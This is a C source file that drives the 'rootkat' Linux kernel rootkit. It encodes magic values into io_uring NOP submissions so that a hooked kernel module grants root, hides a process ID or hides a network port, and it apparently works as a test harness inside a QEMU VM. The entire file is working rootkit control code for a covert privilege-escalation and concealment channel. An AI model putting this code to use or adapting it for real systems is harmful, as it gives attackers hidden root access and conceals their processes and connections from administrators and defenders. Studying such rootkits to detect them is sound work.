// SPDX-License-Identifier: MIT
/*
 * Driver for the rootkat io_uring covert-channel control surface.
 * Submits an IORING_OP_NOP SQE with rootkat-encoded user_data and
 * waits for completion. The side-effect (privesc / hide-pid /
 * hide-port) happens in the kernel during io_issue_sqe dispatch.
 *
 * usage:
 *   io_uring_helper privesc
 *   io_uring_helper hide_pid
 *   io_uring_helper hide_port <port>
 *
 * Builds statically inside the rootkat-build container; runs in the
 * QEMU test VM with the rootkat module loaded.
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <grp.h>
#include <linux/io_uring.h>
#include <pwd.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <unistd.h>

/* MUST match lkm/hook_io_issue_sqe.h. Encoding:
 *   bits [63:32] = magic
 *   bits [31:24] = action
 *   bits [23: 0] = arg
 */
#define ROOTKAT_IO_MAGIC_HI       0x726b6174ULL
#define ROOTKAT_IO_ACT_PRIVESC    1
#define ROOTKAT_IO_ACT_HIDE_PID   2
#define ROOTKAT_IO_ACT_HIDE_PORT  3

static int io_uring_setup(unsigned entries, struct io_uring_params *p)
{
	return (int)syscall(__NR_io_uring_setup, entries, p);
}

static int io_uring_enter(int fd, unsigned to_submit, unsigned min_complete,
                          unsigned flags)
{
	return (int)syscall(__NR_io_uring_enter, fd, to_submit, min_complete,
	                    flags, NULL, 0);
}

struct ring {
	int    fd;
	void  *sq_ptr;
	void  *cq_ptr;
	void  *sqes;
	size_t sq_size;
	size_t cq_size;
	size_t sqe_size;
	struct io_uring_params p;
};

static int ring_init(struct ring *r)
{
	memset(r, 0, sizeof(*r));
	r->fd = io_uring_setup(1, &r->p);
	if (r->fd < 0) {
		fprintf(stderr, "io_uring_setup: %s\n", strerror(errno));
		return -1;
	}

	r->sq_size  = r->p.sq_off.array + r->p.sq_entries * sizeof(__u32);
	r->cq_size  = r->p.cq_off.cqes  + r->p.cq_entries * sizeof(struct io_uring_cqe);
	r->sqe_size = r->p.sq_entries * sizeof(struct io_uring_sqe);

	r->sq_ptr = mmap(NULL, r->sq_size, PROT_READ | PROT_WRITE,
	                 MAP_SHARED | MAP_POPULATE, r->fd, IORING_OFF_SQ_RING);
	if (r->sq_ptr == MAP_FAILED) {
		fprintf(stderr, "mmap SQ_RING: %s\n", strerror(errno));
		return -1;
	}
	r->cq_ptr = mmap(NULL, r->cq_size, PROT_READ | PROT_WRITE,
	                 MAP_SHARED | MAP_POPULATE, r->fd, IORING_OFF_CQ_RING);
	if (r->cq_ptr == MAP_FAILED) {
		fprintf(stderr, "mmap CQ_RING: %s\n", strerror(errno));
		return -1;
	}
	r->sqes = mmap(NULL, r->sqe_size, PROT_READ | PROT_WRITE,
	               MAP_SHARED | MAP_POPULATE, r->fd, IORING_OFF_SQES);
	if (r->sqes == MAP_FAILED) {
		fprintf(stderr, "mmap SQES: %s\n", strerror(errno));
		return -1;
	}
	return 0;
}

static int submit_nop(struct ring *r, uint64_t user_data)
{
	struct io_uring_sqe *sqe = (struct io_uring_sqe *)r->sqes;
	__u32 *sq_array = (__u32 *)((char *)r->sq_ptr + r->p.sq_off.array);
	__u32 *sq_tail  = (__u32 *)((char *)r->sq_ptr + r->p.sq_off.tail);
	__u32  mask     = *(__u32 *)((char *)r->sq_ptr + r->p.sq_off.ring_mask);

	memset(sqe, 0, sizeof(*sqe));
	sqe->opcode    = IORING_OP_NOP;
	sqe->user_data = user_data;

	__u32 tail = *sq_tail;
	sq_array[tail & mask] = 0;            /* SQE index */
	__atomic_store_n(sq_tail, tail + 1, __ATOMIC_RELEASE);

	int rc = io_uring_enter(r->fd, 1, 1, IORING_ENTER_GETEVENTS);
	if (rc < 0) {
		fprintf(stderr, "io_uring_enter: %s\n", strerror(errno));
		return -1;
	}
	return 0;
}

static int do_privesc(void)
{
	struct passwd *nobody = getpwnam("nobody");
	if (!nobody) { perror("getpwnam(nobody)"); return 1; }
	if (setgroups(0, NULL) ||
	    setregid(nobody->pw_gid, nobody->pw_gid) ||
	    setreuid(nobody->pw_uid, nobody->pw_uid)) {
		perror("drop priv");
		return 1;
	}
	fprintf(stderr, "[before] uid=%u euid=%u\n", getuid(), geteuid());
	if (geteuid() != nobody->pw_uid) {
		fprintf(stderr, "FAIL: drop didn't stick\n");
		return 1;
	}

	struct ring r;
	if (ring_init(&r) < 0) return 1;

	uint64_t ud = (ROOTKAT_IO_MAGIC_HI << 32) |
	              ((uint64_t)ROOTKAT_IO_ACT_PRIVESC << 24);
	if (submit_nop(&r, ud) < 0) return 1;

	fprintf(stderr, "[after]  uid=%u euid=%u\n", getuid(), geteuid());
	if (geteuid() != 0) {
		fprintf(stderr, "FAIL: still not root after io_uring magic\n");
		return 1;
	}
	fprintf(stderr, "PASS: privesc via io_uring SQE\n");
	return 0;
}

static int do_hide_pid(void)
{
	struct ring r;
	if (ring_init(&r) < 0) return 1;
	uint64_t ud = (ROOTKAT_IO_MAGIC_HI << 32) |
	              ((uint64_t)ROOTKAT_IO_ACT_HIDE_PID << 24);
	if (submit_nop(&r, ud) < 0) return 1;
	fprintf(stderr, "submitted hide_pid SQE for pid %d\n", (int)getpid());
	/* Stay alive so the test harness can grep /proc for our PID. */
	pause();
	return 0;
}

static int do_hide_port(uint16_t port)
{
	struct ring r;
	if (ring_init(&r) < 0) return 1;
	uint64_t ud = (ROOTKAT_IO_MAGIC_HI << 32) |
	              ((uint64_t)ROOTKAT_IO_ACT_HIDE_PORT << 24) |
	              port;
	if (submit_nop(&r, ud) < 0) return 1;
	fprintf(stderr, "submitted hide_port SQE for port %u\n", port);
	return 0;
}

int main(int argc, char **argv)
{
	if (argc < 2) {
		fprintf(stderr, "usage: %s {privesc|hide_pid|hide_port <port>}\n", argv[0]);
		return 1;
	}
	if (!strcmp(argv[1], "privesc"))   return do_privesc();
	if (!strcmp(argv[1], "hide_pid"))  return do_hide_pid();
	if (!strcmp(argv[1], "hide_port")) {
		if (argc != 3) { fprintf(stderr, "hide_port needs a port arg\n"); return 1; }
		return do_hide_port((uint16_t)atoi(argv[2]));
	}
	fprintf(stderr, "unknown action: %s\n", argv[1]);
	return 1;
}
